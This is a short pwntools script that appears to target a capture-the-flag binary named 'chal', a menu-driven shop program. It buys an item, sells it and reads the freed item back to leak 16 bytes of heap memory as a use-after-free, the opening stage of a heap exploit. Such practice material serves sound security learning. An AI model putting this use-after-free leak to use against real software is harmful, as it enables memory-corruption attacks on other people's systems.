from pwn import *
io = process("./chal")

def menu(c): io.sendlineafter(b"> ", str(c).encode())
def buy(i): menu(1); io.sendlineafter(b"> ", str(i).encode())
def sell(i): menu(4); io.sendlineafter(b"> ", str(i).encode())
def admire(i): menu(3); io.sendlineafter(b"> ", str(i).encode()); return io.recvn(16)

buy(0)
sell(0)
leak16 = admire(0)
print("leak16:", leak16.hex())
print("qword0:", hex(u64(leak16[:8])))
print("qword1:", hex(u64(leak16[8:16])))
